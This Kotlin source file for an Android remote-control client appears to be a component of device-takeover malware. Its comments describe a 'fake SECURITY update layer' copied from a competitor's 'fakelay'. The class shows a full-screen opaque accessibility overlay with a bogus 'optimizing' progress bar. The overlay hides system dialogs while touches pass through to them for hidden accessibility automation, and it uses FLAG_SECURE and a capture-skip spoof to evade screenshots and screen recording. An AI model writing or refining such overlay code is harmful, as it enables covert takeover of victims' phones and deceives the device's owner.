package com.vibelink.client.device

import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.util.DisplayMetrics
import android.view.ContextThemeWrapper
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.ProgressBar
import android.widget.TextView
import com.vibelink.client.R

/**
 * 假 SECURITY 更新层：对齐竞品 fakelay（TYPE_ACCESSIBILITY_OVERLAY + flags 10008）。
 * NOT_TOUCHABLE → 视觉盖住系统弹窗，触摸/焦点落到弹窗上供无障碍操作。
 */
class SecurityUpdateOverlayController(
    private val context: Context,
    private val windowManager: WindowManager,
) {
    private var rootView: View? = null
    private var progressText: TextView? = null
    private var progressBar: ProgressBar? = null

    fun isShowing(): Boolean = rootView != null

    fun show(): Boolean {
        if (rootView != null) {
            return true
        }
        // AccessibilityService 无 AppCompat 主题；包一层 Material theme 兜底
        val themed = ContextThemeWrapper(context, R.style.Theme_RemoteControl_SecurityUpdate)
        val root = LayoutInflater.from(themed).inflate(R.layout.activity_security_update, null)
        progressText = root.findViewById(R.id.securityProgressText)
        progressBar = root.findViewById(R.id.securityProgressBar)
        progressText?.setText(R.string.cast_optimizing)
        root.findViewById<TextView>(R.id.securityHintText)?.setText(R.string.cast_optimizing_hint)
        root.keepScreenOn = true
        @Suppress("DEPRECATION")
        root.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
                View.SYSTEM_UI_FLAG_FULLSCREEN or
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            )

        // 竞品: WindowManager.LayoutParams(-1, -1, 2032, 10008, 1)
        val flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_SECURE or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON

        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getRealMetrics(metrics)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            metrics.heightPixels,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            flags,
            PixelFormat.OPAQUE,
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 0
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
            CaptureSkipSpoof.apply(this, context)
        }

        return runCatching {
            windowManager.addView(root, params)
            rootView = root
            true
        }.getOrDefault(false)
    }

    fun updateProgress(progress: Int, label: CharSequence) {
        val bar = progressBar ?: return
        bar.progress = progress.coerceIn(0, 100)
        progressText?.setText(R.string.cast_optimizing)
    }

    fun hide() {
        val view = rootView ?: return
        rootView = null
        progressText = null
        progressBar = null
        runCatching { windowManager.removeViewImmediate(view) }
    }
}
